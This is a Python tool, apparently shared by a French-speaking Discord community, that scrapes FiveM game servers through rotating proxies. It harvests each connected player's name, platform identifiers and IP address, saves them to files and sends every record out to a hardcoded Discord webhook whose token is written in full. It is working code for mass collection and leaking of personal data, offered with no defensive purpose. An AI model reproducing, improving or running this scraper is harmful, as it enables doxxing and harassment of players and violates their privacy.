import os
import re
import uuid
import json
import time
import requests
from fake_useragent import UserAgent
from colorama import init, Fore, Style
from pystyle import Anime, Colors, Colorate, Center

def clean_filename(hostname):
    return re.sub(r'[^\w\s-]', '', hostname).strip()

def check_if_player_exists(filename, player_data, added_players):
    if not os.path.exists(filename):
        return False

    with open(filename, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    for line in lines:
        try:
            existing_player = json.loads(line)
        except json.JSONDecodeError:
            continue

        if existing_player.get('fivem') == player_data.get('fivem'):
            fields_to_check = ['steam', 'name', 'live', 'xbl', 'license', 'license2']
            fields_match = True

            for field in fields_to_check:
                existing_field_value = existing_player.get(field)
                new_field_value = player_data.get(field)

                if (existing_field_value is not None or new_field_value is not None) and existing_field_value != new_field_value:
                    fields_match = False
                    break

            if fields_match:
                return True

    if player_data['identifiers'] in added_players:
        return True

    return False

def send_to_webhook(player_data, server_name):
    webhook_url = 'https://discord.com/api/webhooks/1267922742372733040/8Inuo0PpN8izvrTBUSNBRzoyScEAwqxnDjQn26XfoMGUMNSFZpvcZCwHsbVVLIyd7scz'
    headers = {
        'Content-Type': 'application/json'
    }

    formatted_data = f"|| Serveur: {server_name} - {json.dumps(player_data, ensure_ascii=False)}  || // JOIN https://discord.gg/1plikation !!! "
    payload = {
        "content": formatted_data
    }

    try:
        response = requests.post(webhook_url, headers=headers, json=payload)
        if response.status_code == 200:
            print(Fore.BLUE + '[WEBHOOK]' + Style.RESET_ALL + ' Les données ont été envoyées à la webhook avec succès.')
        else:
            print(Fore.RED + f'[WEBHOOK] Statut de la réponse: {response.status_code}' + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f'succer d\'envoi à la webhook: ' + Style.RESET_ALL)

def get_ip_from_identifiers(identifiers):
    for identifier in identifiers:
        if identifier.startswith("ip:"):
            return identifier.split(":")[1]
    return "Non disponible"

def get_server_info(server_id, proxy, added_players):
    url = f'https://servers-frontend.fivem.net/api/servers/single/{server_id}'
    user_agent = UserAgent()
    headers = {
        'User-Agent': user_agent.random
    }

    try:
        response = requests.get(url, headers=headers, proxies=proxy)

        if response.status_code == 200:
            server_data = response.json()
            hostname = clean_filename(str(uuid.uuid4()))

            try:
                hostname = clean_filename(server_data['Data']['hostname'])[:100]
            except Exception as err:
                print(err)

            try:
                if len(server_data['Data']['vars']['sv_projectName']) >= 10:
                    hostname = clean_filename(server_data['Data']['vars']['sv_projectName'])[:100]
            except:
                pass

            if not os.path.exists('Scr@p Efféctuer'):
                os.makedirs('Scr@p Efféctuer')

            filename = f'Scr@p Efféctuer/{hostname}.sql'
            server_name = server_data['Data']['hostname'] if 'hostname' in server_data['Data'] else 'Nom inconnu'

            for player in server_data['Data']['players']:
                player_data = player
                player_identifiers = player['identifiers']
                player_data['ip'] = get_ip_from_identifiers(player_identifiers)  

                if not check_if_player_exists(filename, player_data, added_players):
                    with open(filename, 'a', encoding='utf-8') as file:
                        file.write(json.dumps(player_data, ensure_ascii=False))
                        file.write('\n')

                    print(Fore.RED + f'[Scr@p Efféctuer] {player["name"]} a été ajouté avec IP: {player_data["ip"]}' + Style.RESET_ALL)
                    added_players.append(player_identifiers)

                    send_to_webhook(player_data, server_name)

            print('\n' + Fore.CYAN + '[AUTHOR]' + Style.RESET_ALL + ' zeleph1pliker | discord | .gg/1plikation' + Fore.MAGENTA + '\n[INFO]' + Style.RESET_ALL + f' CFX ID : {server_id}' + Fore.MAGENTA + '\n[INFO]' + Style.RESET_ALL + f' Scr@p Efféctuer : {filename}' + '\n')

        else:
            print(Fore.RED + f'\n[ERROR]' + Style.RESET_ALL + f" Message d'erreur ({server_id}: {response.status_code})\n")

    except Exception as e:
        print(f'Erreur: {str(e)}')

def process_servers(server_ids, proxies, added_players):
    for server_id, proxy in zip(server_ids, proxies):
        get_server_info(server_id, proxy, added_players)
        time.sleep(0.5)

def main():
    with open('cfxid.sql', 'r') as server_file:
        french_server_ids = [line.strip() for line in server_file.readlines()]

    with open('proxy.sql', 'r') as proxy_file:
        proxy_list = [{'http': f'socks5://{proxy.strip()}'} for proxy in proxy_file]

    added_players = []

    while True:
        half_length = len(french_server_ids) // 2
        first_half = french_server_ids[:half_length]
        second_half = french_server_ids[half_length:]

        process_servers(first_half, proxy_list, added_players)
        process_servers(second_half, proxy_list, added_players)

    
def startup():
    
    os.system('clear' if os.name == 'posix' else 'cls')

    intro = """

    [+] made by: zeleph'SX

    [+]discord: discord.gg/1plikation

 ▄████▄   ██▓    ▒███████▒   
▒██▀ ▀█  ▓██▒    ▒ ▒ ▒ ▄▀░   
▒▓█    ▄ ▒██░    ░ ▒ ▄▀▒░    
▒▓▓▄ ▄██▒▒██░      ▄▀▒   ░   
▒ ▓███▀ ░░██████▒▒███████▒   
░ ░▒ ▒  ░░ ▒░▓  ░░▒▒ ▓░▒░▒   
  ░  ▒   ░ ░ ▒  ░░░▒ ▒ ░ ▒   
░          ░ ░   ░ ░ ░ ░ ░   
░ ░          ░  ░  ░ ░       
░                ░                                                  

                    > Press Enter                                         

    """

    Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.035, enter=True)


    ascii_art = r'''
_____________________________________________________
|                                                   |
|⠀⠀⠀⠀⠀⠀⣀⢀⣠⣤⠴⠶⠚⠛⠉⣹⡇⠀⢸⠀⠀⠀⠀⠀⢰⣄⠀⠀⠀⠀⠈⢦⡀⠙⠦⣄⣀⠀⠀⠀⢳⡀⠈⢦⠀⠀⢸⠀⠀⠀ |
|⠀⠉⠀⠀⠀⡏⠀⢰⠃⠀⠀⠀⣿⡇⠀⢸⡀⠀⠀⠀⠀⢸⣸⡆⠀⠀⠀⠰⣌⣧⡆⠀⢷⡀⠀⠀⣄⢳⠀⠀⢣⠀⠀⠀⢸⠀⠀⠀⠀  |
|⠀⠀⠀⠀⠀⡇⠀⠘⠀⠀⠀⢀⣿⣇⠀⠸⡇⣆⠀⠀⠀⠀⣿⣿⡀⠀⠀⠀⢹⣾⡇⠀⢸⢣⠀⠀⠘⣿⣇⠀⠈⢧⠀⠀⠘⠀⢠⠀ ⠀ |
|⠀⠀⠀⠀⢀⡇⠀⡀⠀⠀⠀⢸⠈⢻⡄⠀⢷⣿⠀⠀⠀⠀⢹⡏⣇⠀⣀⣀⠀⣿⣧⠀⢸⠾⣇⣠⣄⣸⣿⡄⠀⠘⡆⠀⠀⠀⠀⠆⠀  |
|⠀⠀⠀⠀⣾⢿⠀⠇⠀⠀⠀⢸⠀⠀⢳⡀⢸⣿⡆⠀⠀⠀⣬⣿⡿⠟⠋⠉⠙⠻⣽⣀⡏⠀⠙⠃⢹⡙⡿⣷⠀⠀⢹⠀⠀⠀⠀⠰⠒  |
|⠀⠀⠀⢸⣿⣿⣇⢸⠀⠀⠀⢸⣦⣤⡀⣷⣸⡟⢧⣀⡴⠶⠿⠻⡄⣀⣤⣴⡾⠖⠚⠿⡀⠀⠀⠀⠈⣧⠁⠹⠆⠀⠀⣇⠀⠀⠀⠀⠀  |
|⠀⠀⢀⢸⣀⣼⣿⣿⡆⠀⢀⡘⡇⠀⠀⠹⡟⢷⡜⢉⣠⣠⣠⣀⣤⡿⣛⣥⣶⣾⡿⠛⠿⠿⣶⣦⡤⢹⠀⢀⠀⠀⠀⢹⡄⠀⠀⠀⠀  |
|⠀⠀⢸⢸⡛⠁⠀⠙⢿⠋⠉⠉⠻⠀⠀⠀⢿⣄⠈⠁⠀⠀⠀⢉⢟⣴⡿⠿⠟⢁⠇⠀⠀⠀⠀⠹⣿⠻⡇⢸⠀⠀⠀⠈⣷⠀⠀⠀⠀  |
|⠀⣀⣀⣘⣿⡇⠀⢀⣠⣤⣶⣶⣶⣾⣦⡀⠀⠈⡿⠀⠀⠀⠀⠀⠀⣿⠟⠳⠦⡤⠊⠀⠀⠀⠀⠀⣸⠇⠀⡇⣼⠀⢰⠀⠀⢹⣇⠀ ⠀⠀|
|⠛⠁⠈⣿⣷⣧⣴⣿⠿⠛⣿⠿⣿⣿⡿⠗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⣠⣴⣶⠿⠿⠿⡷⢛⠕⠷⡄⣧⣿⠀⢸⠀⠀⠸⣿⡄⠀⠀ |
|⠀⠀⢠⣿⢿⣿⣿⠁⠀⠀⠈⠳⠤⠶⠃⠀⠀⢰⡀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⠟⣱⠒⡠⢆⡴⣣⣯⢞⣴⡟⢿⡄⡏⠀⠀⠀⡏⢷⡀⠀ |
|⠀⠀⡌⣿⠀⠙⣿⡦⢀⣤⡴⣶⠖⣲⠆⢀⠞⠁⠱⠀⠀⠀⠀⠀⠠⣾⠟⠛⡡⠞⠁⢀⡴⢋⢎⣽⡿⣫⠋⠀⠘⢷⠃⡄⠀⠀⡇⠈⣿⡀ |
|⠀⠀⣇⢹⣦⠀⠼⢃⡾⣩⣴⠃⠿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠠⠋⠁⠀⠀⠈⠁⠀⢀⠞⠀⠀⠀⠀⣤⣶⣋⡀⠀⣠⡿⠁⠀  |
|⠀⠀⢻⣌⢿⡆⠀⡝⣼⠟⣩⢏⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⢀⠞⠁⠀⠀⠀⠀⠀⣧⠞⠀. ⠀.|
|⡀⠀⢸⣿⣿⣷⠆⢠⠏⡴⠃⡡⠋⠀⠀⠀⠀⠀⠀⣀⣠⠤⠔⠒⠤⣄⣀⠀⠀⢀⣰⠏⠀⠀⠀⠀⢀⣠⡾⠗⠋⢰⠏⡇ ⠀⠘⠀⠰⢻ |
|⣇⠀⠘⣿⣿⣟⠻⣄⡞⠀⠐⠁⠀⠀⠀⠀⠀⣠⠞⣩⣤⣶⣶⣾⣷⣶⣬⣿⣿⣿⡏⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⢸⡆⡇⠀⠀⠀⠀⠀  |
|⠹⡄⠀⠹⣿⣿⡄⠀⠉⠉⠀⡀⠀⠀⠈⢻⣾⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣇⣧⠀⠀⠀⠀⠀  |
|⠀⣿⢦⣀⠘⢿⣷⡀⠀⠀⡀⢦⠀⠀⠀⠀⠹⣿⣿⠏⠙⢻⣿⡿⠛⠉⠀⠸⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⠀⠀⡆⠀⠀⡀ |
|⢼⣿⠀⠈⢳⣤⣉⣻⣤⣀⣉⣩⠆⠀⠀⠀⠀⠹⡿⠀⠀⠈⡿⠀⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀⠀⠓⠂⠀⣠⣾⣿⣿⡿⣧⣀⠧⣰⣻⢄⠀ |
|⣾⠃⠀⣠⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⢸⡇⠀⠀⢠⠴⣿⡄⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⡿⣦⣀⠧⣰⣻⢄⠀⠀ |
|⠛⠶⢾⣿⣽⣭⣽⣭⢹⣷⠀⢹⣦⣀⠀⠀⠀⠀⡄⠀⠀⣸⡀⠀⠀⠁⣰⣧⠀⠀⣽⠀⠀⠀⠀⢀⣴⣾⣿⣿⡟⣻⣿⣿⣿⣿⠿⠛⠉⠀ |
|⠀⠀⠀⠈⠙⠿⣿⣿⣿⠏⠀⣾⣿⣿⣷⣦⣀⠀⢇⠀⠀⠈⠁⠀⣠⠔⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⣼⣿⠏⣷⡈⠉ |
|⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣾⣿⣿⣿⣿⣿⣿⣷⣾⡆⠀⠀⠀⡾⠁⠀⠀⠀⣀⡴⠞⠛⣛⣿⡿⠿⠛⠛⠉⠉⠀⠀⠀⢰⣿⡿⠂⠈⠻⡄ |
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢎⠉⠛⠻⠿⠿⠿⠿⠿⣇⠠⠸⣇⣀⣤⣴⣾⡭⠶⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠇⠀⠀⠀⠘ |
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⣤⡀⠀⠀⠀⠀⠀⠈⣳⠀⣿⠛⠻⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⡯⠀⠀⠀⠀  |
|___________________________________________________|
'''

    print(Fore.RED + ascii_art + Style.RESET_ALL)

if __name__ == '__main__':
    init()  
    startup()
    main()
